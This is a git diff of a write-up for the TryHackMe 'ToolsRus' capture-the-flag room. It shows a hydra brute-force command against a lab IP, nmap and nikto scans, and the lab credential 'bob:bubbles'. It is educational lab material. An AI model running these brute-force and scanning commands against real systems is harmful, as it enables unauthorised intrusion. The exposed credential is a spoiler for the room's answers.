@@ -12,19 +12,14 @@ This is a writeup to the [ToolsRus Room](https://tryhackme.com/room/toolsrus) on
 * What directory has basic authentication?
   * Eventually the "protected" directory shows up in dirbuster.
 * What is bob's password to the protected part of the website?
-
 	```
 	kali@kali:~$ hydra -l bob -P rockyou.txt 10.10.70.1 http-get /protected
-	Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
-
-	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-16 00:54:40
-	[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+	...
 	[DATA] attacking http-get://10.10.70.1:80/protected
 	[80][http-get] host: 10.10.70.1   login: bob   password: <censored>
 	1 of 1 target successfully completed, 1 valid password found
 	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-16 00:54:44
 	```
-
 * What other port that serves a web service is open on the machine? Going to the service running on that port, what is the name and version of the software? What version of Apache-Coyote is this service using? What version of Apache-Coyote is this service using?
 	```
 	kali@kali:~$ nmap 10.10.70.1 -A
@@ -46,7 +41,6 @@ This is a writeup to the [ToolsRus Room](https://tryhackme.com/room/toolsrus) on
 	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 	```
 * Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above.
-
 	```
 	kali@kali:~$ nikto -host http://10.10.70.1:1234/manager/html -id bob:bubbles
 	- Nikto v2.1.6
